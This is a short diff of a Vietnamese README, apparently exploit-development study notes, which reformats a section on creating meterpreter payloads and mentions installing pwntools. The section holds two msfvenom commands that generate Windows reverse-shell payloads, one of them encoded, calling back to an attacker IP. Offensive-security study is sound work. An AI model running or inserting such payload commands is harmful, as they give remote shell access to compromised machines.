@@ -24,9 +24,11 @@
 [WSAStartup](./Functions/WSAStartup/README.md) 
 
 
-Tạo meterpreter:
-msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f exe -v met.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=8080 -f python –e x86/shikata_ga_nai -b "\x00..."
+- Tạo meterpreter:
+  - msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f exe -v met.exe
+    
+  - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=8080 -f python –e x86/shikata_ga_nai -b "\x00..."
+    
 
 Cài pwntool
 python3 -m pip install --upgrade pip
